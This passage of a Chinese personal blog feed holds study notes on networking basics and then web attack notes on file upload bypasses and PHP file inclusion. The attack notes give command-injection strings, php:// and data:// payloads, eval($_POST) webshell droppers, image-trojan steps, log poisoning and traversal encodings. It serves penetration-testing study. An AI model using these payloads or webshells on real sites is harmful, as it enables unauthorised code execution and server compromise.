100就为一个数据包</p><p>标志：看数据包是否分片<img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200619112943227.png" alt="image-20200619112943227"></p><p>生存时间（TTL）：每过一个路由器，生存时间会修改。</p><p>协议号：交给哪个协议进行处理</p><p>（ICMP 1      IGMP  2       TCP  6        UDP  17  IPv6   41       OSPF   89）</p><p>数据链路层支持数据包1500字节</p><p>IP层支持数据包是65535字节，所以需要分片传输，但一般不会超过1500字节。</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200619111512690.png" alt="image-20200619111512690"></p><h1 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h1><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807090006669.png" alt="image-20200807090006669"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807090512480.png" alt="image-20200807090512480"></p><p><strong>Active Mode</strong></p><p>第二信道是服务器主动发起的。</p><p>第一信道是21端口</p><p>第二信道是20端口</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807100649933.png" alt="image-20200807100649933"></p><p><strong>Passive</strong></p><p>第一信道是21端口</p><p>第二信道是随机端口</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807100800469.png" alt="image-20200807100800469"></p><h1 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h1><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807145634367.png" alt="image-20200807145634367"></p><p><strong>telnet</strong>的端口是23端口</p><h1 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h1><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200811154248708.png" alt="image-20200811154248708"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这个只有这一部分了&lt;/p&gt;
&lt;p&gt;后面学了但好像丢了&lt;/p&gt;
&lt;p&gt;看多会学到计网时，再来补这一篇&lt;/p&gt;
&lt;h1 id=&quot;计网初学&quot;&gt;&lt;a href=&quot;#计网初学&quot; class=&quot;headerlink&quot; title=&quot;计网初学&quot;&gt;&lt;/a&gt;计网初学&lt;/h1&gt;&lt;h2 id=&quot;</summary>
      
    
    
    
    <category term="计网" scheme="https://pz1o.top/categories/%E8%AE%A1%E7%BD%91/"/>
    
    
    <category term="计网" scheme="https://pz1o.top/tags/%E8%AE%A1%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>文件上传</title>
    <link href="https://pz1o.top/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>https://pz1o.top/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2020-12-09T15:26:33.000Z</published>
    <updated>2020-12-09T15:27:06.160Z</updated>
    
    <content type="html"><![CDATA[<h1 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h1><p><a href="https://www.andseclab.com/2018/12/01/%e4%b8%8a%e4%bc%a0%e6%bc%8f%e6%b4%9e%e6%94%bb%e5%87%bb%e6%80%bb%e7%bb%93/" target="_blank" rel="noopener">https://www.andseclab.com/2018/12/01/%e4%b8%8a%e4%bc%a0%e6%bc%8f%e6%b4%9e%e6%94%bb%e5%87%bb%e6%80%bb%e7%bb%93/</a></p><h2 id="0x01基本流程"><a href="#0x01基本流程" class="headerlink" title="0x01基本流程"></a>0x01基本流程</h2><ol><li>图片是否正常上传。</li><li>图片上传内容是否被感染。（内容替换 抓包改）</li><li>上传的域名是否是目标服务器。</li><li>上传的目录是否支持解析</li></ol><h2 id="0x02绕过js"><a href="#0x02绕过js" class="headerlink" title="0x02绕过js"></a>0x02绕过js</h2><h2 id="0x03文件上传空字节"><a href="#0x03文件上传空字节" class="headerlink" title="0x03文件上传空字节"></a>0x03文件上传空字节</h2><p>抓包的时候 %00</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.jpg%00.php</span><br><span class="line">1.php%00.jpg</span><br></pre></td></tr></table></figure><h2 id="0x04文件上传名单验证"><a href="#0x04文件上传名单验证" class="headerlink" title="0x04文件上传名单验证"></a>0x04文件上传名单验证</h2><p>黑名单：不允许什么上传</p><p>白名单：允许什么上传</p><p>可以尝试php3 php4 php5 phtml，pht使用  或服务器解析漏洞</p><h2 id="0x05二次上传"><a href="#0x05二次上传" class="headerlink" title="0x05二次上传"></a>0x05二次上传</h2><h2 id="0x06MIME"><a href="#0x06MIME" class="headerlink" title="0x06MIME"></a>0x06MIME</h2><p>content-type中表示了文件类型。</p><h2 id="0x07解析漏洞"><a href="#0x07解析漏洞" class="headerlink" title="0x07解析漏洞"></a>0x07解析漏洞</h2><h3 id="iis解析漏洞"><a href="#iis解析漏洞" class="headerlink" title="iis解析漏洞"></a>iis解析漏洞</h3><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609194945742.png" alt="image-20200609194945742"></p><h3 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h3><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609195122633.png" alt="image-20200609195122633"></p><h3 id="nginx解析漏洞"><a href="#nginx解析漏洞" class="headerlink" title="nginx解析漏洞"></a>nginx解析漏洞</h3><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609195540127.png" alt="image-20200609195540127"></p><h3 id="net上传"><a href="#net上传" class="headerlink" title=".net上传"></a>.net上传</h3><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609200056116.png" alt="image-20200609200056116"></p><h3 id="phtml上传"><a href="#phtml上传" class="headerlink" title="phtml上传"></a>phtml上传</h3><p>在apache配置文件中添加（httpd.conf）中添加</p><p>AddType application/x-httpd-php.phtml</p><p>这样phtml后缀的文件就会按照php去解析</p><h3 id="htaccess上传"><a href="#htaccess上传" class="headerlink" title=".htaccess上传"></a>.htaccess上传</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files *.jpg&gt;</span><br><span class="line">ForceType:application&#x2F;x-httpd-php</span><br><span class="line">SetHandler:application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;Files&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;1.jpg</span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;会将所有的jpg文件都按照php来解析</span><br></pre></td></tr></table></figure><h2 id="0x08双文件上传"><a href="#0x08双文件上传" class="headerlink" title="0x08双文件上传"></a>0x08双文件上传</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;上传漏洞&quot;&gt;&lt;a href=&quot;#上传漏洞&quot; class=&quot;headerlink&quot; title=&quot;上传漏洞&quot;&gt;&lt;/a&gt;上传漏洞&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.andseclab.com/2018/12/01/%e4%b8%8a%e4%bc%</summary>
      
    
    
    
    <category term="web" scheme="https://pz1o.top/categories/web/"/>
    
    
    <category term="web" scheme="https://pz1o.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>文件包含</title>
    <link href="https://pz1o.top/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>https://pz1o.top/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2020-12-09T15:21:27.000Z</published>
    <updated>2020-12-09T15:23:42.040Z</updated>
    
    <content type="html"><![CDATA[<p>今天在整理硬盘的一些东西，有些web学的东西又不想扔，就传上来。</p><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="0x01定义"><a href="#0x01定义" class="headerlink" title="0x01定义"></a>0x01定义</h2><p>在通过服务器脚本的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，导致意外的文件泄露甚至恶意的代码注入。</p><h2 id="0x02环境要求"><a href="#0x02环境要求" class="headerlink" title="0x02环境要求"></a>0x02环境要求</h2><ul><li>allow_url_fopen=On(默认为On) 规定是否允许从远程服务器或者网站检索数据</li><li>allow_url_include=On(php5.2之后默认为Off) 规定是否允许include/require远程文件</li></ul><h2 id="0x03文件包含函数"><a href="#0x03文件包含函数" class="headerlink" title="0x03文件包含函数"></a>0x03文件包含函数</h2><ul><li>include():可获得指定文件中的所有文本，并把文本拷贝到使用 include 函数的文件中。include() 函数<strong>会生成一个警告，但是脚本会继续执行。</strong></li><li>require():函数接受的所有文本文件,并将它复制到指定的文件中，使用了包括功能。如果在加载一个文件时有任何问题，<strong>生成一个致命错误,停止脚本的执行。</strong></li></ul><h2 id="0x04命令执行"><a href="#0x04命令执行" class="headerlink" title="0x04命令执行"></a>0x04命令执行</h2><p><a href="https://www.ghtwf01.cn/index.php/archives/273/#menu_index_21" target="_blank" rel="noopener">https://www.ghtwf01.cn/index.php/archives/273/#menu_index_21</a></p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、</p><p>passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令</p><p>拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。</p><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul><li><p>应用调用执行系统命令的函数</p></li><li><p>将用户输入作为系统命令的参数拼接到了命令行中</p></li><li><p>没有对用户输入进行过滤或过滤不严</p></li></ul><hr><h3 id="常用连接符"><a href="#常用连接符" class="headerlink" title="常用连接符"></a>常用连接符</h3><ul><li>在Windows和Linux中我们可以使用<strong>&amp;来执行多条命令。</strong></li><li><strong>|</strong>：前面命令输出结果作为后面命令的输入内容；输入8.8.8.8|whoami </li><li><strong>||</strong>：前面命令执行失败的时候才执行后面的命令</li><li><strong>&amp;&amp;</strong>：前面命令执行成功了才执行后面的命令</li><li>在Linux中还可以用；号来连接。</li></ul><h3 id="常见命令执行函数"><a href="#常见命令执行函数" class="headerlink" title="常见命令执行函数"></a>常见命令执行函数</h3><ul><li><p>system：成功执行返回结果的最后一行，否则返回FALSE</p></li><li><p>exec：成功执行返回结果的最后一行</p></li><li><p>shell_exec：成功执行返回全部结果，否则返回NULL</p></li><li><p>passthru ：把命令的运行结果原样地直接输出到标准输出设备上</p></li></ul><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>读取指定目录内容</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...|dir C:\user</span><br></pre></td></tr></table></figure><p><strong>读取指定文件内容</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8.8.8.8|type C:\windows\win.ini</span><br></pre></td></tr></table></figure><hr><h2 id="0x05php伪协议"><a href="#0x05php伪协议" class="headerlink" title="0x05php伪协议"></a>0x05php伪协议</h2><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>php://input:<strong>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。</strong>当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容，从而导致任意代码执行。</p><p>在ctf中，php://input用于执行php代码。</p><p>通常会有两种类型：</p><ol><li>任意代码执行</li><li>文件内容绕过</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(“shell.php”,”w”),’&lt;?php eval($_POST[&quot;cmd&quot;];?&gt;’);?&gt;</span><br></pre></td></tr></table></figure><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p><strong>php://filter</strong>可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;xxx.php</span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</span><br></pre></td></tr></table></figure><h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p><strong>zip://</strong> 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用方法</span><br><span class="line">zip:&#x2F;&#x2F;archive.zip#dir&#x2F;file.txt</span><br><span class="line">zip:&#x2F;&#x2F;[压缩文件绝对路径]#[压缩文件内的子文件名]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;cmd.php?file&#x3D;zip:&#x2F;&#x2F;D:&#x2F;soft&#x2F;phpStudy&#x2F;WWW&#x2F;file.jpg%23phpcode.txt</span><br><span class="line"></span><br><span class="line">先将要执行的PHP代码写好文件名为phpcode.txt，将phpcode.txt进行zip压缩,压缩文件名为file.zip,如果可以上传zip文件便直接上传，若不能便将file.zip重命名为file.jpg后在上传，其他几种压缩格式也可以这样操作。</span><br><span class="line"></span><br><span class="line">由于#在get请求中会将后面的参数忽略所以使用get请求时候应进行url编码为%23，且此处经过测试相对路径是不可行，所以只能用绝对路径。</span><br></pre></td></tr></table></figure><h3 id="data-和phar"><a href="#data-和phar" class="headerlink" title="data://和phar://"></a>data://和phar://</h3><p><strong>data://</strong> 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data:&#x2F;&#x2F;[MIME-type][;charset&#x3D;&lt;encoding&gt;][;base64],&lt;data&gt;</span><br><span class="line"></span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;&lt;?php phpinfo()?&gt;</span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br></pre></td></tr></table></figure><p><strong>phar://</strong> 有点类似zip://同样可以导致 任意代码执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;phar:&#x2F;&#x2F;zip.jpg&#x2F;cmd.php</span><br><span class="line">?file&#x3D;phar:&#x2F;&#x2F;D:\zip.jpg\cmd.php</span><br></pre></td></tr></table></figure><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200803154243815.png" alt="image-20200803154243815"></p><h2 id="0x06包含Apache日志文件"><a href="#0x06包含Apache日志文件" class="headerlink" title="0x06包含Apache日志文件"></a>0x06包含Apache日志文件</h2><p>WEB服务器一般会将用户的访问记录保存在访问日志中。那么我们可以根据日志记录的内容，精心构造请求，把PHP代码插入到日志文件中，通过文件包含漏洞来执行日志中的PHP代码。</p><p>利用条件：</p><ul><li>对日志文件可读</li><li>知道日志文件的存储目录</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> Apache运行后一般默认会生成两个日志文件，Windos下是access.log（访问日志）和error.log(错误日志)，Linux下是access_log和error_log，访问日志文件记录了客户端的每次请求和服务器响应的相关信息。</span><br><span class="line">  如果访问一个不存在的资源时，如http:&#x2F;&#x2F;www.xxxx.com&#x2F;&lt;?php phpinfo(); ?&gt;,则会记录在日志中，但是代码中的敏感字符会被浏览器转码，我们可以通过burpsuit绕过编码，就可以把&lt;?php phpinfo(); ?&gt; 写入apache的日志文件，然后可以通过包含日志文件来执行此代码，但前提是你得知道apache日志文件的存储路径，所以为了安全起见，安装apache时尽量不要使用默认路径。</span><br></pre></td></tr></table></figure><h2 id="0x07包含SESSION"><a href="#0x07包含SESSION" class="headerlink" title="0x07包含SESSION"></a>0x07包含SESSION</h2><p>可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</p><p>利用条件：</p><ol><li>找到SESSION内的可控变量</li><li>SESSION文件可读写，并且知道存储路径</li></ol><p>php的session文件的保存路径可以在phpinfo的session.save_path看到。</p><h2 id="0x08包含临时文件"><a href="#0x08包含临时文件" class="headerlink" title="0x08包含临时文件"></a>0x08包含临时文件</h2><p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p><p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</p><h2 id="0x09包含上传文件"><a href="#0x09包含上传文件" class="headerlink" title="0x09包含上传文件"></a>0x09包含上传文件</h2><p>很多网站通常会提供文件上传功能，比如：上传头像、文档等，这时就可以采取上传一句话图片木马的方式进行包含。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">图片马的制作方式如下，在cmd控制台下输入：</span><br><span class="line"></span><br><span class="line">进入1.jpg和2.php的文件目录后，执行：</span><br><span class="line"></span><br><span class="line">copy  1.jpg&#x2F;b+2.php  3.jpg</span><br><span class="line"></span><br><span class="line">将图片1.jpg和包含php代码的2.php文件合并生成图片马3.jpg</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">假设已经上传一句话图片木马到服务器，路径为&#x2F;upload&#x2F;201811.jpg</span><br><span class="line">图片代码如下：</span><br><span class="line">&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[&#39;pass&#39;]);?&gt;&quot;)?&gt;</span><br><span class="line"></span><br><span class="line">然后访问URL：http:&#x2F;&#x2F;www.xxxx.com&#x2F;index.php?page&#x3D;.&#x2F;upload&#x2F;201811.jpg，包含这张图片，将会在index.php所在的目录下生成shell.php</span><br></pre></td></tr></table></figure><h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><h2 id="0x10指定前缀绕过"><a href="#0x10指定前缀绕过" class="headerlink" title="0x10指定前缀绕过"></a>0x10指定前缀绕过</h2><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>使用../../返回上一目录，称为目录遍历</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;..&#x2F;..&#x2F;Flag&#x2F;flag.txt</span><br></pre></td></tr></table></figure><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="comment">//前缀</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"/var/www/html/"</span>.$file;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><ol><li><p>url编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;</span><br><span class="line">%2e%2e%2f</span><br><span class="line">..%2f</span><br><span class="line">%2e%2e&#x2F;</span><br><span class="line"></span><br><span class="line">..\</span><br><span class="line">%2e%2e%5c</span><br><span class="line">..%5c</span><br><span class="line">%2e%2e\</span><br></pre></td></tr></table></figure></li><li><p>二次编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;</span><br><span class="line">%252e%252e%252f</span><br><span class="line"></span><br><span class="line">..\</span><br><span class="line">%252e%252e%255c</span><br></pre></td></tr></table></figure></li><li><p>容器/服务器编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;</span><br><span class="line">..%c0%af</span><br><span class="line">%c0%ae%c0%ae&#x2F;</span><br><span class="line"></span><br><span class="line">..\</span><br><span class="line">..%c1%9c</span><br></pre></td></tr></table></figure></li></ol><h2 id="0x11指定后缀绕过"><a href="#0x11指定后缀绕过" class="headerlink" title="0x11指定后缀绕过"></a>0x11指定后缀绕过</h2><p>后缀测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="comment">//后缀</span></span><br><span class="line"><span class="keyword">include</span> $file.<span class="string">".txt"</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="利用url"><a href="#利用url" class="headerlink" title="利用url"></a>利用url</h3><p>完整url格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protocol :&#x2F;&#x2F; hostname[:port] &#x2F; path &#x2F; [;parameters][?query]#fragment</span><br></pre></td></tr></table></figure><p><strong>query(?)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;拼接参数</span><br><span class="line">?file&#x3D;http:&#x2F;&#x2F;localhost:8080&#x2F;phpinfo.php?</span><br><span class="line">&#x2F;&#x2F;拼接后</span><br><span class="line">?file&#x3D;http:&#x2F;&#x2F;localhost:8081&#x2F;phpinfo.php?.txt</span><br></pre></td></tr></table></figure><p><strong>fragment(#)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;拼接参数</span><br><span class="line">?file&#x3D;http:&#x2F;&#x2F;localhost:8081&#x2F;phpinfo.php%23</span><br><span class="line">&#x2F;&#x2F;拼接后</span><br><span class="line">?file&#x3D;http:&#x2F;&#x2F;localhost:8081&#x2F;phpinfo.php#.txt</span><br></pre></td></tr></table></figure><h3 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h3><p><strong>zip://</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;拼接参数</span><br><span class="line">?file&#x3D;zip:&#x2F;&#x2F;[压缩文件绝对路径]%23phpinfo</span><br><span class="line">&#x2F;&#x2F;拼接后</span><br><span class="line">?file&#x3D;zip:&#x2F;&#x2F;[压缩文件绝对路径]%23phpinfo.txt</span><br></pre></td></tr></table></figure><p><strong>phar://</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;拼接参数</span><br><span class="line">?file&#x3D;phar:&#x2F;&#x2F;php.zip&#x2F;phpinfo</span><br><span class="line">&#x2F;&#x2F;拼接后</span><br><span class="line">?file&#x3D;phar:&#x2F;&#x2F;php.zip&#x2F;phpinfo.txt</span><br></pre></td></tr></table></figure><h3 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h3><p><strong>利用条件：</strong></p><ul><li>php版本 &lt; php 5.2.8</li></ul><p><strong>原理：</strong></p><ul><li>Windows下目录最大长度为256字节，超出的部分会被丢弃</li><li>Linux下目录最大长度为4096字节，超出的部分会被丢弃。</li></ul><p><strong>利用方法：</strong></p><ul><li><p>只需要不断的重复 ./(Windows系统下也可以直接用 . 截断)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  ?file&#x3D;.&#x2F;.&#x2F;.&#x2F;。。。省略。。。.&#x2F;.&#x2F;shell.php</span><br><span class="line">1</span><br></pre></td></tr></table></figure></li></ul><p>则指定的后缀.txt会在达到最大值后会被直接丢弃掉</p><h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p><strong>利用条件：</strong></p><ul><li>magic_quotes_gpc = Off</li><li>php版本 &lt; php 5.3.4</li></ul><p><strong>利用方法：</strong></p><ul><li><p>直接在文件名的最后加上%00来截断指定的后缀名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  ?file&#x3D;shell.php%00</span><br><span class="line">1</span><br></pre></td></tr></table></figure></li></ul><p>注：现在用到%00阶段的情况已经不多了</p><h2 id="0x12通过phpinfo去Getshell"><a href="#0x12通过phpinfo去Getshell" class="headerlink" title="0x12通过phpinfo去Getshell"></a>0x12通过phpinfo去Getshell</h2><p><a href="https://cloud.tencent.com/developer/article/1609810" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1609810</a></p><p>phpinfo文件泄露一直被大家所忽视，但其实phpinfo可以为攻击渗透测试人员提供很多的信息。</p><p>1.system</p><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215927019.png" alt="image-20200928215927019"></p><p>提供服务器所在的操作系统的信息。</p><p>2.真实ip</p><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215935664.png" alt="image-20200928215935664"></p><p>知道真实ip的我们可以省去cdn带来的各种困扰。我们同时也可以端口旁站一顿操作。</p><p> 3.web根目录</p><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215944121.png" alt="image-20200928215944121"></p><p>网站绝对路径对渗透测试相当的有用，当你找到SQL注入点时，要上传木马的时候就需要知道网站的绝对路径才可以获取webshell。假如该网站使用的是如xampp之类的快速搭建的软件，你便可以寻找该软件对应的漏洞去尝试攻击目标网站。</p><ol><li>disable_functions</li></ol><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215953280.png" alt="image-20200928215953280"></p><p>通过disable_functions你可以了解到该网站禁用了些什么函数，然后去绕过代码执行和编写webshell时遇到的问题。</p><ol><li>临时文件路径</li><li><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928220004673.png" alt="image-20200928220004673"></li></ol><p>这次通过phpinfo来getshell的关键，phpinfo可以让我们获得临时文件路径。向phpinfo页面post恶意代码，可以在_FILES[“file1”]中看到上传的临时文件，如果该网站存在文件包含漏洞，便可以将恶意代码存储我们已知的绝对路径去包含它getshell。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天在整理硬盘的一些东西，有些web学的东西又不想扔，就传上来。&lt;/p&gt;
